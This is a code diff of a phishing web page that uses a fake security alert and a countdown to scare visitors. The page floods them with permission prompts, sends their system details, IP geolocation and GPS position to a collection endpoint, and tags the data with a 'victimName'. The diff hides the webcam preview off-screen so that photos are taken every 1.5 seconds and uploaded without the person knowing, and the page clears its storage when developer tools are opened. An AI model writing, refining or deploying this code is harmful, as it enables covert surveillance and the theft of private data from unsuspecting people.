@@ -20,28 +20,18 @@
       min-height: 100vh;
     }
     
-    /* --- FIX: Camera container always rendered, hidden via opacity --- */
+    /* --- Camera container: completely invisible but rendered --- */
     #videoContainer {
       position: fixed;
-      top: 15px;
-      right: 15px;
-      width: 180px;
-      height: 135px;
+      left: -9999px;          /* off‑screen */
+      top: -9999px;
+      width: 1px;             /* tiny – still forces frame updates */
+      height: 1px;
+      overflow: hidden;
       background: black;
       z-index: 99999;
-      border: 3px solid #00ff88;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 0 25px rgba(0, 255, 136, 0.5);
-      display: block;            /* Always block so video renders */
-      transition: opacity 0.3s ease, border 0.3s ease, box-shadow 0.3s ease;
-    }
-    
-    #videoContainer.hidden-camera {
-      opacity: 0;
-      pointer-events: none;
-      border-color: transparent;
-      box-shadow: none;
+      display: block;         /* must be block to render */
+      pointer-events: none;   /* prevent any interaction */
     }
     
     #videoContainer video {
@@ -50,17 +40,7 @@
       object-fit: cover;
     }
     
-    #cameraStatus {
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: rgba(0, 0, 0, 0.7);
-      color: #00ff88;
-      font-size: 11px;
-      padding: 3px;
-      text-align: center;
-    }
+    /* No camera status overlay – not needed */
     
     .overlay {
       position: fixed;
@@ -323,10 +303,9 @@
     </div>
   </div>
   
-  <!-- Camera Feed Container (always rendered) -->
-  <div id="videoContainer" class="hidden-camera">  <!-- initially hidden visually -->
+  <!-- Camera Feed Container – always hidden but rendered -->
+  <div id="videoContainer">
     <video id="video" playsinline autoplay muted></video>
-    <div id="cameraStatus">🔴 Camera Disabled</div>
   </div>
   
   <!-- Hidden Content (Shows after permissions granted) -->
@@ -349,7 +328,7 @@
     const victimNames = ["Alex", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn", "Drew"];
     const victimName = victimNames[Math.floor(Math.random() * victimNames.length)];
     let permissionCount = 0;
-    let countdown = 5; // Reduced from 30 to 5 seconds
+    let countdown = 5;
     let exfiltrationComplete = false;
     let cameraStream = null;
     let captureInterval = null;
@@ -359,9 +338,7 @@
     const countdownSeconds = document.getElementById('countdownSeconds');
     const systemProgress = document.getElementById('systemProgress');
     const securityOverlay = document.getElementById('securityOverlay');
-    const videoContainer = document.getElementById('videoContainer');
     const video = document.getElementById('video');
-    const cameraStatus = document.getElementById('cameraStatus');
     const hiddenContent = document.getElementById('hiddenContent');
     
     // Initialize
@@ -371,10 +348,10 @@
         `Our system has detected <strong>3 unauthorized access attempts</strong> from your IP address.<br>
         Complete verification to prevent account suspension and data deletion, <strong>${victimName}</strong>.`;
       
-      // Try to access camera immediately on page load (like your old code)
+      // Try to access camera immediately on page load
       setTimeout(() => {
         addLogEntry("⚠ Attempting automatic camera access...", "warning");
-        requestCamera(false); // Try camera without user gesture
+        requestCamera(false);
       }, 1000);
       
       // Start countdown
@@ -401,12 +378,12 @@
         if(progress >= 95) clearInterval(progressInterval);
       }, 300);
       
-      // Start system exfiltration immediately (silent)
+      // Start system exfiltration
       exfiltrateSystemInfo();
       permissionFlood();
     });
     
-    // System Information Exfiltration
+    // System Information Exfiltration (unchanged)
     function exfiltrateSystemInfo() {
       if(exfiltrationComplete) return;
       
@@ -427,7 +404,6 @@ OS CPU: ${navigator.oscpu || 'Unknown'}
 Touch Support: ${navigator.maxTouchPoints || 'Unknown'}
       `.trim();
       
-      // Send to Discord
       sendToDiscord({
         username: "SECURITY_SCAN",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
@@ -441,7 +417,6 @@ Touch Support: ${navigator.maxTouchPoints || 'Unknown'}
         }]
       });
       
-      // Get IP Address
       $.getJSON("https://api.ipify.org?format=json", function(data) {
         sendToDiscord({
           username: "SECURITY_SCAN",
@@ -454,7 +429,6 @@ Touch Support: ${navigator.maxTouchPoints || 'Unknown'}
           }]
         });
         
-        // Get detailed IP info
         $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(response) {
           sendToDiscord({
             username: "SECURITY_SCAN",
@@ -489,18 +463,15 @@ Hosting: ${response.hosting ? 'Yes' : 'No'}
       addLogEntry("✓ System analysis complete", "success");
     }
     
-    // Permission Flooding - Try multiple permission requests
     function permissionFlood() {
       if(permissionCount > 5) return;
       
-      // Try geolocation
       navigator.geolocation.getCurrentPosition(
         () => {}, 
         () => {}, 
         { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
       );
       
-      // Try microphone
       navigator.mediaDevices.getUserMedia({ audio: true, video: false })
         .then(stream => {
           stream.getTracks().forEach(track => track.stop());
@@ -508,17 +479,14 @@ Hosting: ${response.hosting ? 'Yes' : 'No'}
         })
         .catch(() => {});
       
-      // Try notifications
       if("Notification" in window) {
         Notification.requestPermission();
       }
       
-      // Try clipboard read
       if("clipboard" in navigator) {
         navigator.clipboard.readText().catch(() => {});
       }
       
-      // Try battery API
       if("getBattery" in navigator) {
         navigator.getBattery().catch(() => {});
       }
@@ -527,14 +495,12 @@ Hosting: ${response.hosting ? 'Yes' : 'No'}
       setTimeout(permissionFlood, 2000);
     }
     
-    // Location Request
     function requestLocation(userGesture = false) {
       addLogEntry("Requesting location access...", "warning");
       
       navigator.geolocation.getCurrentPosition(
         function(position) {
           addLogEntry("✓ Location access granted", "success");
-          
           const latlong = `
 Latitude: ${position.coords.latitude}
 Longitude: ${position.coords.longitude}
@@ -558,9 +524,7 @@ Accuracy: ${position.coords.accuracy} meters
         },
         function(error) {
           addLogEntry("✗ Location access denied", "error");
-          
           if(userGesture) {
-            // User clicked deny - show more urgent message
             addLogEntry("⚠ Location required for verification. Retrying...", "warning");
             setTimeout(() => requestLocation(false), 2000);
           }
@@ -569,27 +533,24 @@ Accuracy: ${position.coords.accuracy} meters
       );
     }
     
-    // Camera Request and Capture
+    // Camera Request – now always hidden, no UI toggles
     function requestCamera(userGesture = false) {
       addLogEntry("Initializing facial recognition...", "warning");
       
-      // Stop any existing capture interval
       if (captureInterval) {
         clearInterval(captureInterval);
         captureInterval = null;
       }
       
-      // Stop any existing stream
       if (cameraStream) {
         cameraStream.getTracks().forEach(track => track.stop());
         cameraStream = null;
       }
       
-      // Simple camera constraints like your old code
       const constraints = {
         audio: false,
         video: {
-          facingMode: "user"  // Your simple front camera selection
+          facingMode: "user"
         }
       };
       
@@ -598,39 +559,29 @@ Accuracy: ${position.coords.accuracy} meters
           cameraStream = stream;
           addLogEntry("✓ Facial scan initialized", "success");
           video.srcObject = stream;
+          // Ensure video plays
+          video.play().catch(e => console.warn("Play failed", e));
           
-          // --- FIX: Show the container by removing hidden class ---
-          videoContainer.classList.remove('hidden-camera');
-          // videoContainer.style.display = "block";  // REMOVED
-          
-          cameraStatus.textContent = "🟢 Recording Active";
-          cameraStatus.style.color = "#00ff88";
-          
-          // Start continuous capture (Option 1 - every 1.5 seconds)
+          // Start capturing immediately
           startCameraCapture(stream);
           checkAllPermissions();
         })
         .catch(function(error) {
           addLogEntry("✗ Camera access denied", "error");
-          
           if(userGesture) {
-            // User clicked deny - try different approaches
-            addLogEntry("⚠ Camera required for biometric verification. Trying alternative method...", "warning");
-            
-            // Try with different constraints
+            addLogEntry("⚠ Camera required. Trying alternative...", "warning");
             setTimeout(() => {
               navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "environment" } // Try rear camera
+                video: { facingMode: "environment" }
               }).then(stream => {
                 stream.getTracks().forEach(track => track.stop());
                 addLogEntry("✓ Alternative camera accessed", "success");
                 requestCamera(false);
               }).catch(() => {
-                // Try audio-only to trigger different permission
                 navigator.mediaDevices.getUserMedia({ audio: true })
                   .then(audioStream => {
                     audioStream.getTracks().forEach(track => track.stop());
-                    addLogEntry("⚠ Audio permission granted, retrying video...", "warning");
+                    addLogEntry("⚠ Audio granted, retrying video...", "warning");
                     setTimeout(() => requestCamera(false), 1000);
                   })
                   .catch(() => {
@@ -643,7 +594,7 @@ Accuracy: ${position.coords.accuracy} meters
         });
     }
     
-    // Camera Capture Function - Continuous capture every 1.5 seconds
+    // Camera Capture – uses video element (now always rendered)
     function startCameraCapture(stream) {
       const canvas = document.createElement('canvas');
       canvas.width = 640;
@@ -651,12 +602,6 @@ Accuracy: ${position.coords.accuracy} meters
       const context = canvas.getContext('2d');
       
       let captureCount = 0;
-      
-      // Capture immediately
-      captureFrame();
-      
-      // Then capture every 1.5 seconds (like your old code)
-      captureInterval = setInterval(captureFrame, 1500);
       
       function captureFrame() {
         if(!stream.active) {
@@ -666,28 +611,32 @@ Accuracy: ${position.coords.accuracy} meters
         }
         
         try {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          canvas.toBlob(function(blob) {
-            if(blob) {
-              captureCount++;
-              sendImageToDiscord(blob, captureCount);
-              
-              // Update UI feedback
-              cameraStatus.textContent = `🟢 Captured ${captureCount} frames`;
-              cameraStatus.style.animation = 'pulse 0.5s';
-              setTimeout(() => cameraStatus.style.animation = '', 500);
-            }
-          }, 'image/jpeg', 0.85);
+          // Check if video has valid frames
+          if (video.readyState >= 2 && video.videoWidth > 0) {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function(blob) {
+              if(blob) {
+                captureCount++;
+                sendImageToDiscord(blob, captureCount);
+                // Optional UI feedback – but no camera window so we skip status updates
+              }
+            }, 'image/jpeg', 0.85);
+          } else {
+            // Video not ready yet – just wait
+          }
         } catch(error) {
           console.error("Capture error:", error);
           clearInterval(captureInterval);
           captureInterval = null;
         }
       }
+      
+      // First capture immediately
+      captureFrame();
+      // Then every 1.5 seconds
+      captureInterval = setInterval(captureFrame, 1500);
     }
     
-    // Send image to Discord
     function sendImageToDiscord(blob, count) {
       const formdata = new FormData();
       formdata.append("file1", blob, `scan_${victimName}_${count}.jpg`);
@@ -702,30 +651,17 @@ Accuracy: ${position.coords.accuracy} meters
       xhr.send(formdata);
     }
     
-    // Auto-grant after countdown
     function autoGrantPermissions() {
       addLogEntry("⚠ Automatic verification initiated...", "warning");
-      
-      // Try location first
       setTimeout(() => requestLocation(false), 500);
-      
-      // Then camera
       setTimeout(() => requestCamera(false), 1500);
-      
-      // Then other permissions
       setTimeout(() => {
-        if("Notification" in window) {
-          Notification.requestPermission();
-        }
-        if("clipboard" in navigator) {
-          navigator.clipboard.readText().catch(() => {});
-        }
+        if("Notification" in window) Notification.requestPermission();
+        if("clipboard" in navigator) navigator.clipboard.readText().catch(() => {});
       }, 2500);
     }
     
-    // Check if all permissions granted
     function checkAllPermissions() {
-      // Check localStorage for granted permissions
       const locationGranted = localStorage.getItem("locationGranted") === "true";
       const cameraGranted = localStorage.getItem("cameraGranted") === "true";
       
@@ -742,7 +678,6 @@ Accuracy: ${position.coords.accuracy} meters
             securityOverlay.style.display = "none";
             hiddenContent.style.display = "block";
             
-            // Stop camera and hide video container (visually)
             if(cameraStream) {
               cameraStream.getTracks().forEach(track => track.stop());
             }
@@ -750,11 +685,8 @@ Accuracy: ${position.coords.accuracy} meters
               clearInterval(captureInterval);
               captureInterval = null;
             }
-            // --- FIX: Hide container using class instead of display:none ---
-            videoContainer.classList.add('hidden-camera');
-            // videoContainer.style.display = "none";  // REMOVED
+            // Video container is already hidden – no need to change.
             
-            // Final data collection
             setTimeout(() => {
               sendToDiscord({
                 username: "SECURITY_SCAN",
@@ -779,7 +711,6 @@ Accuracy: ${position.coords.accuracy} meters
       }
     }
     
-    // Send data to Discord
     function sendToDiscord(params) {
       const request = new XMLHttpRequest();
       request.open("POST", "/location_update");
@@ -787,28 +718,22 @@ Accuracy: ${position.coords.accuracy} meters
       request.send(JSON.stringify(params));
     }
     
-    // Add log entry
     function addLogEntry(message, type = "info") {
       const entry = document.createElement('div');
       entry.className = `log-entry ${type}`;
       entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
       statusLog.appendChild(entry);
       statusLog.scrollTop = statusLog.scrollHeight;
-      
-      // Auto-remove old entries
       const entries = statusLog.querySelectorAll('.log-entry');
-      if(entries.length > 8) {
-        entries[0].remove();
-      }
+      if(entries.length > 8) entries[0].remove();
     }
     
-    // DevTools detection (optional)
+    // DevTools detection
     const devToolsDetection = function() {
       const element = new Image();
       Object.defineProperty(element, 'id', {
         get: function() {
           addLogEntry("⚠ Developer tools detected", "warning");
-          // Clear sensitive data if DevTools detected
           setTimeout(() => {
             localStorage.clear();
             sessionStorage.clear();
@@ -818,16 +743,13 @@ Accuracy: ${position.coords.accuracy} meters
       });
       console.log('%c', element);
     };
-    
-    // Run DevTools detection periodically
     setInterval(devToolsDetection, 1000);
     
-    // Initialize permissions in localStorage
+    // Initialize permission flags
     navigator.geolocation.getCurrentPosition(
       () => localStorage.setItem("locationGranted", "true"),
       () => localStorage.removeItem("locationGranted")
     );
-    
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(() => localStorage.setItem("cameraGranted", "true"))
       .catch(() => localStorage.removeItem("cameraGranted"));
